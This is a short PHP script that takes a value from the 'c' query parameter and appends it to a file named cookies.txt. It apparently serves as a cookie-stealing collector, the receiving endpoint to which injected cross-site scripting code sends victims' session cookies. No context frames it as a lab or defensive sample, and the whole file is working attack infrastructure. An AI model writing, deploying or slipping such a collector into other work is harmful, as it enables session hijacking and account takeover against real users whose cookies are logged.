<?php

//ini_set('error_reporting', -1);
//ini_set('display_errors', 1);

if(!isset($_GET['c'])) {
	exit;
}

$cookie = $_GET['c'] . "\n";

$file = fopen("cookies.txt", "a+");
fwrite($file, $cookie);
fclose($file);

